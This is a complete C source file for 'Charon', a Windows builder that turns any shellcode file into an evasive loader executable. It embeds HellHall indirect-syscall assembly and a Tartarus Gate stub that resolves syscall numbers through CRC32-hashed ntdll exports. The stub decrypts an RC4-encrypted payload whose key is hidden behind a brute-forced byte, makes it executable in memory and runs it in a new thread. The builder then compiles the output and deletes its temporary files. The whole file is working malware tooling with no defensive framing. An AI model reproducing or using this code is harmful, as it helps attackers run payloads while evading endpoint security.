#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>

// =================================================================================
//  PART 1: EMBEDDED ASSEMBLY (HellHall)
// =================================================================================
const char* g_HellHallAsm =
".data\n"
"    wSystemCall         DWORD   0h\n"
"    qSyscallInsAdress   QWORD   0h\n"
".code\n"
"    SetSSn proc\n"
"        xor eax, eax\n"
"        mov wSystemCall, eax\n"
"        mov qSyscallInsAdress, rax\n"
"        mov eax, ecx\n"
"        mov wSystemCall, eax\n"
"        mov r8, rdx\n"
"        mov qSyscallInsAdress, r8\n"
"        ret\n"
"    SetSSn endp\n"
"    RunSyscall proc\n"
"        xor r10, r10\n"
"        mov rax, rcx\n"
"        mov r10, rax\n"
"        mov eax, wSystemCall\n"
"        jmp Run\n"
"        xor eax, eax\n"
"        xor rcx, rcx\n"
"        shl r10, 2\n"
"    Run:\n"
"        jmp qword ptr [qSyscallInsAdress]\n"
"        xor r10, r10\n"
"        mov qSyscallInsAdress, r10\n"
"        ret\n"
"    RunSyscall endp\n"
"end\n";

// =================================================================================
//  PART 2: MONOLITHIC C TEMPLATE
//  Fixed USTRING definition and added Debug Prints
// =================================================================================
const char* g_StubTemplate =
"#include <windows.h>\n"
"#include <stdio.h>\n"
"\n"
"// --- [SECTION 1] STRUCTS & DEFINITIONS ---\n"
"#define UP      -32\n"
"#define DOWN    32\n"
"#define RANGE   0xFF\n"
"\n"
"// FIX: Proper struct definition for SystemFunction032 compatibility\n"
"typedef struct _USTRING {\n"
"    DWORD Length;\n"
"    DWORD MaximumLength;\n"
"    PVOID Buffer;\n"
"} USTRING, *PUSTRING;\n"
"\n"
"typedef struct _UNICODE_STRING {\n"
"    USHORT Length;\n"
"    USHORT MaximumLength;\n"
"    PWSTR  Buffer;\n"
"} UNICODE_STRING, * PUNICODE_STRING;\n"
"\n"
"typedef struct _PEB_LDR_DATA {\n"
"    ULONG Length;\n"
"    BOOLEAN Initialized;\n"
"    HANDLE SsHandle;\n"
"    LIST_ENTRY InLoadOrderModuleList;\n"
"    LIST_ENTRY InMemoryOrderModuleList;\n"
"    LIST_ENTRY InInitializationOrderModuleList;\n"
"    PVOID EntryInProgress;\n"
"    BOOLEAN ShutdownInProgress;\n"
"    HANDLE ShutdownThreadId;\n"
"} PEB_LDR_DATA, * PPEB_LDR_DATA;\n"
"\n"
"typedef struct _LDR_DATA_TABLE_ENTRY {\n"
"    LIST_ENTRY InLoadOrderLinks;\n"
"    LIST_ENTRY InMemoryOrderLinks;\n"
"    LIST_ENTRY InInitializationOrderLinks;\n"
"    PVOID DllBase;\n"
"    PVOID EntryPoint;\n"
"    ULONG SizeOfImage;\n"
"    UNICODE_STRING FullDllName;\n"
"    UNICODE_STRING BaseDllName;\n"
"} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;\n"
"\n"
"typedef struct _PEB {\n"
"    BOOLEAN InheritedAddressSpace;\n"
"    BOOLEAN ReadImageFileExecOptions;\n"
"    BOOLEAN BeingDebugged;\n"
"    union {\n"
"        BOOLEAN BitField;\n"
"        struct {\n"
"            BOOLEAN ImageUsesLargePages : 1;\n"
"            BOOLEAN IsProtectedProcess : 1;\n"
"            BOOLEAN IsImageDynamicallyRelocated : 1;\n"
"            BOOLEAN SkipPatchingUser32Forwarders : 1;\n"
"            BOOLEAN IsPackagedProcess : 1;\n"
"            BOOLEAN IsAppContainer : 1;\n"
"            BOOLEAN IsProtectedProcessLight : 1;\n"
"            BOOLEAN IsLongPathAwareProcess : 1;\n"
"        };\n"
"    };\n"
"    HANDLE Mutant;\n"
"    PVOID ImageBaseAddress;\n"
"    PPEB_LDR_DATA Ldr;\n"
"} PEB, * PPEB;\n"
"\n"
"typedef struct _NT_SYSCALL {\n"
"    DWORD dwSSn;\n"
"    DWORD dwSyscallHash;\n"
"    PVOID pSyscallAddress;\n"
"    PVOID pSyscallInstAddress;\n"
"} NT_SYSCALL, * PNT_SYSCALL;\n"
"\n"
"typedef struct _NTDLL_CONFIG {\n"
"    PVOID uModule;\n"
"    DWORD dwNumberOfNames;\n"
"    PDWORD pdwArrayOfNames;\n"
"    PDWORD pdwArrayOfAddresses;\n"
"    PWORD pwArrayOfOrdinals;\n"
"} NTDLL_CONFIG, * PNTDLL_CONFIG;\n"
"\n"
"// --- [SECTION 2] TARTARUS GATE LOGIC ---\n"
"NTDLL_CONFIG g_NtdllConf = { 0 };\n"
"\n"
"DWORD CRC32B(LPCSTR string) {\n"
"    DWORD mask = 0;\n"
"    DWORD state = 0xFFFFFFFF;\n"
"    unsigned int byte;\n"
"    while ((byte = *string++) != 0) {\n"
"        state = state ^ byte;\n"
"        for (int j = 0; j < 8; j++) {\n"
"            mask = -(int)(state & 1);\n"
"            state = (state >> 1) ^ (0xEDB88320 & mask);\n"
"        }\n"
"    }\n"
"    return ~state;\n"
"}\n"
"#define HASH(x) CRC32B(x)\n"
"\n"
"BOOL InitNtdllConfigStructure() {\n"
"    PPEB pPeb = (PPEB)__readgsqword(0x60);\n"
"    if (!pPeb || !pPeb->Ldr) return FALSE;\n"
"    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)pPeb->Ldr->InLoadOrderModuleList.Flink;\n"
"    while (pDte->DllBase != NULL) {\n"
"        if (pDte->BaseDllName.Length == 18) {\n"
"             g_NtdllConf.uModule = pDte->DllBase;\n"
"             break;\n"
"        }\n"
"        pDte = (PLDR_DATA_TABLE_ENTRY)pDte->InLoadOrderLinks.Flink;\n"
"    }\n"
"    if (!g_NtdllConf.uModule) return FALSE;\n"
"    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)g_NtdllConf.uModule;\n"
"    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)g_NtdllConf.uModule + pDos->e_lfanew);\n"
"    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)g_NtdllConf.uModule + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
"    g_NtdllConf.dwNumberOfNames = pExport->NumberOfNames;\n"
"    g_NtdllConf.pdwArrayOfNames = (PDWORD)((ULONG_PTR)g_NtdllConf.uModule + pExport->AddressOfNames);\n"
"    g_NtdllConf.pdwArrayOfAddresses = (PDWORD)((ULONG_PTR)g_NtdllConf.uModule + pExport->AddressOfFunctions);\n"
"    g_NtdllConf.pwArrayOfOrdinals = (PWORD)((ULONG_PTR)g_NtdllConf.uModule + pExport->AddressOfNameOrdinals);\n"
"    return TRUE;\n"
"}\n"
"\n"
"BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {\n"
"    if (!g_NtdllConf.uModule) {\n"
"        if (!InitNtdllConfigStructure()) return FALSE;\n"
"    }\n"
"    if (dwSysHash != 0) pNtSys->dwSyscallHash = dwSysHash;\n"
"    else return FALSE;\n"
"\n"
"    for (size_t i = 0; i < g_NtdllConf.dwNumberOfNames; i++) {\n"
"        PCHAR pcFuncName = (PCHAR)((ULONG_PTR)g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);\n"
"        PVOID pFuncAddress = (PVOID)((ULONG_PTR)g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);\n"
"        if (HASH(pcFuncName) == dwSysHash) {\n"
"            pNtSys->pSyscallAddress = pFuncAddress;\n"
"            if (*((PBYTE)pFuncAddress) == 0x4C && *((PBYTE)pFuncAddress + 1) == 0x8B && *((PBYTE)pFuncAddress + 2) == 0xD1 && *((PBYTE)pFuncAddress + 3) == 0xB8) {\n"
"                BYTE high = *((PBYTE)pFuncAddress + 5);\n"
"                BYTE low = *((PBYTE)pFuncAddress + 4);\n"
"                pNtSys->dwSSn = (high << 8) | low;\n"
"            }\n"
"            if (*((PBYTE)pFuncAddress) == 0xE9) {\n"
"                for (WORD idx = 1; idx <= RANGE; idx++) {\n"
"                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B) {\n"
"                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);\n"
"                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);\n"
"                        pNtSys->dwSSn = ((high << 8) | low) - idx;\n"
"                        break;\n"
"                    }\n"
"                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B) {\n"
"                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);\n"
"                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);\n"
"                        pNtSys->dwSSn = ((high << 8) | low) + idx;\n"
"                        break;\n"
"                    }\n"
"                }\n"
"            }\n"
"            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {\n"
"                for (WORD idx = 1; idx <= RANGE; idx++) {\n"
"                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B) {\n"
"                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);\n"
"                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);\n"
"                        pNtSys->dwSSn = ((high << 8) | low) - idx;\n"
"                        break;\n"
"                    }\n"
"                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B) {\n"
"                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);\n"
"                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);\n"
"                        pNtSys->dwSSn = ((high << 8) | low) + idx;\n"
"                        break;\n"
"                    }\n"
"                }\n"
"            }\n"
"            break;\n"
"        }\n"
"    }\n"
"    if (!pNtSys->pSyscallAddress) return FALSE;\n"
"    ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF;\n"
"    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {\n"
"        if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05) {\n"
"            pNtSys->pSyscallInstAddress = (PVOID)((ULONG_PTR)uFuncAddress + z);\n"
"            break;\n"
"        }\n"
"    }\n"
"    if (pNtSys->dwSSn != 0 && pNtSys->pSyscallAddress != NULL && pNtSys->dwSyscallHash != 0 && pNtSys->pSyscallInstAddress != NULL) return TRUE;\n"
"    else return FALSE;\n"
"}\n"
"\n"
"// --- [SECTION 3] ASSEMBLY LINKAGE ---\n"
"extern void SetSSn(DWORD dwSSn, PVOID pSyscallInstAddress);\n"
"extern NTSTATUS RunSyscall();\n"
"\n"
"// --- [SECTION 4] PAYLOAD CONFIG ---\n"
"#define KEY_SIZE 16\n"
"#define HINT_BYTE {{HINT_BYTE}}\n"
"#define SET_SYSCALL(NtSys) (SetSSn((DWORD)NtSys.dwSSn,(PVOID)NtSys.pSyscallInstAddress))\n"
"\n"
"#define NtAllocateVirtualMemory_CRC32   0xE0762FEB\n"
"#define NtProtectVirtualMemory_CRC32    0x5C2D1A97\n"
"#define NtCreateThreadEx_CRC32          0x2073465A\n"
"#define NtWaitForSingleObject_CRC32     0xDD554681\n"
"\n"
"unsigned char Rc4CipherText[] = { \n"
"    {{PAYLOAD_BYTES}} \n"
"};\n"
"unsigned char ProtectedKey[] = { \n"
"    {{KEY_BYTES}} \n"
"};\n"
"\n"
"// Define function pointer type for SystemFunction032\n"
"typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
"\n"
"typedef struct _NTAPI_FUNC {\n"
"    NT_SYSCALL  NtAllocateVirtualMemory;\n"
"    NT_SYSCALL  NtProtectVirtualMemory;\n"
"    NT_SYSCALL  NtCreateThreadEx;\n"
"    NT_SYSCALL  NtWaitForSingleObject;\n"
"} NTAPI_FUNC, * PNTAPI_FUNC;\n"
"NTAPI_FUNC g_Nt = { 0 };\n"
"\n"
"BOOL InitializeNtSyscalls() {\n"
"    if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &g_Nt.NtAllocateVirtualMemory)) return FALSE;\n"
"    if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_Nt.NtProtectVirtualMemory)) return FALSE;\n"
"    if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &g_Nt.NtCreateThreadEx)) return FALSE;\n"
"    if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_Nt.NtWaitForSingleObject)) return FALSE;\n"
"    return TRUE;\n"
"}\n"
"\n"
"BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
"    NTSTATUS STATUS = 0;\n"
"    BYTE RealKey[KEY_SIZE] = { 0 };\n"
"    int b = 0;\n"
"    // Brute Force Key\n"
"    printf(\"[i] KeyGuard: Brute forcing key...\\n\");\n"
"    while (1) {\n"
"        if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE) break;\n"
"        else b++;\n"
"        if(b > 255) { printf(\"[!] KeyGuard Failed. 'b' overflow.\\n\"); return FALSE; }\n"
"    }\n"
"    printf(\"[+] Key unlocked. Secret: 0x%02X\\n\", b);\n"
"    for (int i = 0; i < KEY_SIZE; i++) RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
"    \n"
"    USTRING Key = { dwRc4KeySize, dwRc4KeySize, RealKey };\n"
"    USTRING Img = { sPayloadSize, sPayloadSize, pPayloadData };\n"
"    \n"
"    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(\"Advapi32\"), \"SystemFunction032\");\n"
"    if (!SystemFunction032) { printf(\"[!] Advapi32 Error\\n\"); return FALSE; }\n"
"    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) { printf(\"[!] Decryption Error: 0x%X\\n\", STATUS); return FALSE; }\n"
"    return TRUE;\n"
"}\n"
"\n"
"int main() {\n"
"    // Debug Console is active\n"
"    NTSTATUS STATUS = 0;\n"
"    PVOID pAddress = NULL;\n"
"    SIZE_T sSize = sizeof(Rc4CipherText);\n"
"    DWORD dwOld = 0;\n"
"    HANDLE hProcess = (HANDLE)-1;\n"
"    HANDLE hThread = NULL;\n"
"\n"
"    printf(\"[*] Initializing Tartarus Gate...\\n\");\n"
"    if (!InitializeNtSyscalls()) { printf(\"[!] Syscall Init Failed\\n\"); getchar(); return -1; }\n"
"\n"
"    printf(\"[*] Allocating Memory...\\n\");\n"
"    SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);\n"
"    if (RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0 || pAddress == NULL) {\n"
"        printf(\"[!] Alloc Failed\\n\"); getchar(); return -1;\n"
"    }\n"
"\n"
"    printf(\"[*] Decrypting Payload...\\n\");\n"
"    memcpy(pAddress, Rc4CipherText, sizeof(Rc4CipherText));\n"
"    if (!Rc4EncryptionViSystemFunc032(ProtectedKey, (PBYTE)pAddress, sizeof(ProtectedKey), (DWORD)sizeof(Rc4CipherText))) {\n"
"        printf(\"[!] Decryption Failed\\n\"); getchar(); return -1;\n"
"    }\n"
"\n"
"    printf(\"[*] Protecting Memory (RX)...\\n\");\n"
"    sSize = sizeof(Rc4CipherText);\n"
"    SET_SYSCALL(g_Nt.NtProtectVirtualMemory);\n"
"    if (RunSyscall(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READ, &dwOld) != 0) {\n"
"        printf(\"[!] Protect Failed\\n\"); getchar(); return -1;\n"
"    }\n"
"\n"
"    printf(\"[*] Executing via HellHall...\\n\");\n"
"    SET_SYSCALL(g_Nt.NtCreateThreadEx);\n"
"    if (RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL) != 0) {\n"
"        printf(\"[!] CreateThread Failed\\n\"); getchar(); return -1;\n"
"    }\n"
"\n"
"    printf(\"[*] Waiting for payload...\\n\");\n"
"    SET_SYSCALL(g_Nt.NtWaitForSingleObject);\n"
"    RunSyscall(hThread, FALSE, NULL);\n"
"    \n"
"    printf(\"[+] Execution Finished. Press Enter.\\n\");\n"
"    getchar();\n"
"    return 0;\n"
"}\n";

// =================================================================================
//  PART 3: BUILDER TOOLS
// =================================================================================

// --- RC4 Helpers (For the builder itself) ---
typedef struct _USTRING_BUILDER { DWORD Length; DWORD MaximumLength; PVOID Buffer; } USTRING;
typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);

void RC4_Encrypt(unsigned char* key, DWORD keySize, unsigned char* data, DWORD dataSize) {
    HMODULE hAdvapi = LoadLibraryA("Advapi32.dll");
    if (!hAdvapi) return;
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(hAdvapi, "SystemFunction032");
    if (SystemFunction032) {
        USTRING uKey = { keySize, keySize, key };
        USTRING uData = { dataSize, dataSize, data };
        SystemFunction032(&uData, &uKey);
    }
    FreeLibrary(hAdvapi);
}

// --- IO Helpers ---
unsigned char* ReadFileBytes(const char* filename, DWORD* outSize) {
    FILE* f = fopen(filename, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);
    unsigned char* buffer = (unsigned char*)malloc(size);
    if (buffer) fread(buffer, 1, size, f);
    fclose(f);
    *outSize = (DWORD)size;
    return buffer;
}

char* BytesToHexString(unsigned char* data, DWORD size) {
    char* hexStr = (char*)malloc(size * 6 + 10);
    if (!hexStr) return NULL;

    char* ptr = hexStr;
    for (DWORD i = 0; i < size; i++) {
        if (i < size - 1) {
            ptr += sprintf(ptr, "0x%02X, ", data[i]);
        } else {
            ptr += sprintf(ptr, "0x%02X", data[i]);
        }
    }
    return hexStr;
}

char* ReplacePattern(const char* original, const char* pattern, const char* replacement) {
    char* result;
    int i, cnt = 0;
    int newWlen = strlen(replacement);
    int oldWlen = strlen(pattern);
    for (i = 0; original[i] != '\0'; i++) {
        if (strstr(&original[i], pattern) == &original[i]) {
            cnt++;
            i += oldWlen - 1;
        }
    }
    result = (char*)malloc(i + cnt * (newWlen - oldWlen) + 1);
    if (!result) return NULL;
    i = 0;
    while (*original) {
        if (strstr(original, pattern) == original) {
            strcpy(&result[i], replacement);
            i += newWlen;
            original += oldWlen;
        }
        else result[i++] = *original++;
    }
    result[i] = '\0';
    return result;
}

int main(int argc, char* argv[]) {

    // Banner
    printf(
        "\n"
        "   _____ _    _          _____  ____  _   _ \n"
        "  / ____| |  | |   /\\   |  __ \\|  _ \\| \\ | |\n"
        " | |    | |__| |  /  \\  | |__) | | | |  \\| |\n"
        " | |    |  __  | / /\\ \\ |  _  /| | | | . ` |\n"
        " | |____| |  | |/ ____ \\| | \\ \\| |_| | |\\  |\n"
        "  \\_____|_|  |_/_/    \\_\\_|  \\_\\____/|_| \\_|\n"
        "        Artifact Builder & Obfuscator        \n"
        "\n"
    );

    if (argc < 2) {
        printf("Usage: Charon.exe <shellcode_file>\n");
        return 1;
    }

    srand((unsigned int)time(NULL));
    const char* shellcodeFile = argv[1];

    // 1. Setup Data
    printf("[*] Reading Shellcode: %s\n", shellcodeFile);
    DWORD shellcodeSize = 0;
    unsigned char* shellcode = ReadFileBytes(shellcodeFile, &shellcodeSize);
    if (!shellcode) { printf("[!] Failed.\n"); return 1; }

    printf("[*] Encrypting (RC4 + KeyGuard)...\n");
    unsigned char realKey[16], protectedKey[16];
    for (int i = 0; i < 16; i++) realKey[i] = rand() % 255;
    RC4_Encrypt(realKey, 16, shellcode, shellcodeSize);

    unsigned char b = (rand() % 200) + 1;
    for (int i = 0; i < 16; i++) protectedKey[i] = (unsigned char)((realKey[i] + i) ^ b);
    unsigned char hintByte = protectedKey[0] ^ b;
    printf("    -> Secret: 0x%02X | Hint: 0x%02X\n", b, hintByte);

    char* sPayload = BytesToHexString(shellcode, shellcodeSize);
    char* sKey = BytesToHexString(protectedKey, 16);
    char sHint[10]; sprintf(sHint, "0x%02X", hintByte);

    // 2. Prepare Syscalls.asm (Write Embedded ASM to disk)
    printf("[*] Dropping temporary assembly file (syscalls.asm)...\n");
    FILE* fAsm = fopen("syscalls.asm", "w");
    if (fAsm) {
        fputs(g_HellHallAsm, fAsm);
        fclose(fAsm);
    }

    // 3. Assemble
    printf("[*] Assembling (ML64)...\n");
    if (system("ml64 /c /Cx /nologo syscalls.asm") != 0) {
        printf("[!] Assembly failed. Check environment.\n");
        return 1;
    }

    // 4. Patch & Write Monolithic C
    printf("[*] Generating Monolithic C source (artifact.c)...\n");
    char* step1 = ReplacePattern(g_StubTemplate, "{{HINT_BYTE}}", sHint);
    char* step2 = ReplacePattern(step1, "{{PAYLOAD_BYTES}}", sPayload);
    char* finalSource = ReplacePattern(step2, "{{KEY_BYTES}}", sKey);

    FILE* fC = fopen("artifact.c", "w");
    if (fC) {
        fputs(finalSource, fC);
        fclose(fC);
    }

    // 5. Compile Everything
    printf("[*] Compiling Artifact (CL)...\n");
    // Link artifact.c with syscalls.obj
    int res = system("cl /nologo /O2 artifact.c syscalls.obj /Fe:CharonArtifact.exe");

    // 6. Cleanup
    printf("[*] Cleaning up temp files...\n");
    system("del syscalls.asm syscalls.obj artifact.c artifact.obj >NUL 2>&1");
    free(step1); free(step2); free(finalSource); free(sPayload); free(sKey); free(shellcode);

    if (res == 0) printf("\n[+] SUCCESS: CharonArtifact.exe created.\n");
    else printf("\n[!] FAILURE during compilation.\n");

    return 0;
}
